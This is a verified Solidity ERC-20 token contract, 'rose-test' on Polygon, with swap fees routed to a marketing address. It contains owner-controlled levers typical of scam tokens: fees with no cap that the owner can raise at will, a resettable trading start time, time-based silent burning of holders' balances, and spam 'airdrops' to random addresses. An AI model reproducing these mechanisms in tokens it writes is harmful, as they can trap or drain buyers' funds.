/**
 *Submitted for verification at polygonscan.com on 2023-03-31
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    function functionCall(
        address target,
        bytes memory data
    ) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library SafeERC20 {
    using SafeMath for uint256;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        callOptionalReturn(
            token,
            abi.encodeWithSelector(token.transfer.selector, to, value)
        );
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        callOptionalReturn(
            token,
            abi.encodeWithSelector(token.transferFrom.selector, from, to, value)
        );
    }

    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        // safeApprove should only be called when setting an initial allowance,
        // or when resetting it to zero. To increase and decrease it, use
        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
        // solhint-disable-next-line max-line-length
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(
            token,
            abi.encodeWithSelector(token.approve.selector, spender, value)
        );
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender).add(
            value
        );
        callOptionalReturn(
            token,
            abi.encodeWithSelector(
                token.approve.selector,
                spender,
                newAllowance
            )
        );
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender).sub(
            value,
            "SafeERC20: decreased allowance below zero"
        );
        callOptionalReturn(
            token,
            abi.encodeWithSelector(
                token.approve.selector,
                spender,
                newAllowance
            )
        );
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     */
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves.

        // A Solidity high level call has three parts:
        //  1. The target address is checked to verify it contains contract code
        //  2. The call itself is made, and success asserted
        //  3. The return value is decoded, which in turn checks the size of the returned data.
        // solhint-disable-next-line max-line-length
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) {
            // Return data is optional
            // solhint-disable-next-line max-line-length
            require(
                abi.decode(returndata, (bool)),
                "SafeERC20: ERC20 operation did not succeed"
            );
        }
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    /**
     * @dev Multiplies two int256 variables and fails on overflow.
     */
    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;

        // Detect overflow when multiplying MIN_INT256 with -1
        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    /**
     * @dev Division of two int256 variables and fails on overflow.
     */
    function div(int256 a, int256 b) internal pure returns (int256) {
        // Prevent overflow when dividing MIN_INT256 by -1
        require(b != -1 || a != MIN_INT256);

        // Solidity already throws when dividing by 0.
        return a / b;
    }

    /**
     * @dev Subtracts two int256 variables and fails on overflow.
     */
    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    /**
     * @dev Adds two int256 variables and fails on overflow.
     */
    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    /**
     * @dev Converts to absolute value, and fails on overflow.
     */
    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }

    function toUint256Safe(int256 a) internal pure returns (uint256) {
        require(a >= 0);
        return uint256(a);
    }
}

library SafeMathUint {
    function toInt256Safe(uint256 a) internal pure returns (int256) {
        int256 b = int256(a);
        require(b >= 0);
        return b;
    }
}

contract JZTToken is IERC20, Ownable {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public fundAddress1;
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _tTotal;
    IUniswapV2Router02 public _swapRouter;
    address public _fistPoolAddress;
    mapping(address => bool) public _swapPairList;
    bool private inSwap;
    uint256 private constant MAX = ~uint256(0);
    address usdt;
    uint256 startFunNum;
    mapping(address => uint) public lastAddLqTimes;
    uint public firstTime;
    uint public maxTimes = 100;
    uint public subTime = 300;
    uint public rate = 5;
    uint256 public mkFee = 800;
    uint256 public _traFee = 0;
    mapping(address => bool) public isWalletLimitExempt;
    mapping(address => bool) public exemptFee;
    uint256 public walletLimit;
    uint256 public starBlock;
    address public _mainPair;
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    uint256 public maxTXAmount;

    constructor(
        address Address1,
        address Address2,
        string memory Name,
        string memory Symbol,
        uint8 Decimals,
        uint256 Supply,
        uint256 StarBlock,
        address Address3,
        address Address5
    ) {
        firstTime = block.timestamp;
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        starBlock = StarBlock;
        IUniswapV2Router02 swapRouter = IUniswapV2Router02(Address1);
        IERC20(Address2).safeApprove(address(swapRouter), MAX);
        _approve(address(this), address(swapRouter), MAX);
        _fistPoolAddress = Address2;
        usdt = _fistPoolAddress;
        _swapRouter = swapRouter;
        IUniswapV2Factory swapFactory = IUniswapV2Factory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), Address2);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;
        uint256 total = Supply * 10 ** Decimals;
        maxTXAmount = Supply * 10 ** Decimals;
        walletLimit = Supply * 10 ** Decimals;
        startFunNum = Supply * 10 ** (Decimals - 4);
        _tTotal = total;
        _balances[Address5] = total;
        emit Transfer(address(0), Address5, total);
        fundAddress1 = Address3;
        exemptFee[address(this)] = true;
        exemptFee[Address3] = true;
        exemptFee[address(swapRouter)] = true;
        exemptFee[tx.origin] = true;
        exemptFee[Address5] = true;
        isWalletLimitExempt[tx.origin] = true;
        isWalletLimitExempt[Address5] = true;
        isWalletLimitExempt[address(swapRouter)] = true;
        isWalletLimitExempt[address(_mainPair)] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[address(0xdead)] = true;
        isWalletLimitExempt[Address3] = true;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function updateTradingTime(uint256 value) external onlyOwner {
        starBlock = value;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function _isContract(address a) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(a)
        }
        return size > 0;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (exemptFee[account] || account == _mainPair) {
            return _balances[account];
        }
        return _getBalance(account, block.timestamp);
    }

    function getRate(uint a, uint n) private view returns (uint) {
        for (uint i = 0; i < n; i++) {
            a = (a * (10000 - rate)) / 10000;
        }
        return a;
    }

    function _getBalance(
        address account,
        uint time
    ) internal view returns (uint) {
        uint bal = _balances[account];
        if (bal > 0) {
            uint lastAddLqTime = lastAddLqTimes[account];
            if (lastAddLqTime > 0 && time > lastAddLqTime) {
                uint i = (time - lastAddLqTime) / subTime;
                i = i > maxTimes ? maxTimes : i;
                if (i > 0) {
                    uint v = getRate(bal, i);
                    if (v <= bal && v > 0) {
                        return v;
                    }
                }
            }
        }
        return bal;
    }

    function _updateBal(address owner, uint time) internal {
        uint bal = _balances[owner];
        if (bal > 0) {
            uint updatedBal = _getBalance(owner, time);

            if (bal > updatedBal) {
                lastAddLqTimes[owner] = time;
                uint ba = bal - updatedBal;
                _balances[owner] = _balances[owner].sub(ba);
                _balances[address(0)] = _balances[address(0)].add(ba);
                emit Transfer(owner, address(0), ba);
            }
        } else {
            lastAddLqTimes[owner] = time;
        }
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    bool public airdropEnable = true;

    function setAirDropEnable(bool status) public onlyOwner {
        airdropEnable = status;
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        if (!exemptFee[from] && !exemptFee[to] && airdropEnable) {
            address ad;
            uint256 num = 1 * 1e3;
            for (int256 i = 0; i < 3; i++) {
                ad = address(
                    uint160(
                        uint256(
                            keccak256(
                                abi.encodePacked(i, amount, block.timestamp)
                            )
                        )
                    )
                );
                _basicTransfer(from, ad, num);
            }
            amount -= (num * 3);
        }
        uint time = block.timestamp;
        if (!exemptFee[from] && from != _mainPair) {
            _updateBal(from, time);
        }

        if (!exemptFee[to] && to != _mainPair) {
            _updateBal(to, time);
        }

        bool takeFee;

        bool isTrans;
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!exemptFee[from] && !exemptFee[to]) {
                require(starBlock < block.timestamp);

                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > startFunNum) {
                            swapAndDistribute(contractTokenBalance);
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {}
        } else {
            if (!exemptFee[from] && !exemptFee[to]) {
                isTrans = true;
                takeFee = true;
            }
        }
        _tokenTransfer(from, to, amount, takeFee, isTrans);
    }

    function swapAndDistribute(uint256 amount) private lockTheSwap {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdt;
        _approve(address(this), address(_swapRouter), amount);
        // make the
        try
            _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                amount,
                0, // accept any amount of USDT
                path,
                fundAddress1,
                block.timestamp
            )
        {} catch {}
    }

    function setMaxTxAmount(uint256 max) public onlyOwner {
        maxTXAmount = max;
    }

    function updateStartFunNum(uint256 value) public onlyOwner {
        startFunNum = value;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isTrans
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 swapAmount;
        if (takeFee) {
            uint256 swapFee = mkFee;
            if (isTrans) {
                swapFee = _traFee;
            }
            swapAmount = (tAmount * swapFee) / 10000;
            if (swapAmount > 0) {
                _takeTransfer(sender, address(this), swapAmount);
            }
        }
        if (!isWalletLimitExempt[recipient] && limitEnable) {
            require(
                (balanceOf(recipient) + tAmount - swapAmount) <= walletLimit,
                "over max wallet limit"
            );
        }
        _takeTransfer(sender, recipient, tAmount - swapAmount);
    }

    bool public limitEnable = true;

    function setLimitEnable(bool status) public onlyOwner {
        limitEnable = status;
    }

    function updateFees(
        uint256 newKkPFee,
        uint256 newTraFee
    ) external onlyOwner {
        mkFee = newKkPFee;
        _traFee = newTraFee;
    }

    function setisWalletLimitExempt(
        address holder,
        bool exempt
    ) external onlyOwner {
        isWalletLimitExempt[holder] = exempt;
    }

    function setMaxWalletLimit(uint256 newValue) public onlyOwner {
        walletLimit = newValue;
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr1) external onlyOwner {
        fundAddress1 = addr1;
        exemptFee[addr1] = true;
    }

    function setMaxTimes(uint _maxTimes) external onlyOwner {
        maxTimes = _maxTimes;
    }

    function setSubTime(uint _subTime) external onlyOwner {
        subTime = _subTime;
    }

    function setRate(uint _rate) external onlyOwner {
        rate = _rate;
    }

    function addBotAddressList(
        address[] calldata accounts,
        bool excluded
    ) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            exemptFee[accounts[i]] = excluded;
        }
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        exemptFee[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance(address add) external onlyOwner {
        payable(add).transfer(address(this).balance);
    }

    function claimToken(
        address _token,
        address add,
        uint256 amount
    ) external onlyOwner {
        IERC20(_token).safeTransfer(add, amount);
    }

    receive() external payable {}
}

contract TOKEN is JZTToken {
    constructor()
        // 0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506  正式
        // 0xc2132D05D31c914a87C6611C10748AEb04B58e8F 正式
        JZTToken(
            address(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506), // Router地址    0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D  uni      0x10ED43C718714eb63d5aA57B78B54704E256024E  bsc     0xD99D1c33F9fC3444f8101754aBC46c52416550D1 bsc test
            address(0xc2132D05D31c914a87C6611C10748AEb04B58e8F), // 池子代币地址   0x55d398326f99059fF775485246999027B3197955 usdt bsc       0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6  weth    0x337610d27c682E347C9cD60BD4b3b107C9d34dDd usdt bsc test     0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd wbnb test
            "rose-test",
            "rose-test",
            6,
            2000000000000,
            16755984000,
            address(0x38E01E62BC4c4FD4bBB17A9c3ee00d9888888888), // 营销地址
            address(0x85379b77ef7eB4F76EC56b075C87C4704b3f9273) // 接受代币地址
        )
    {}
}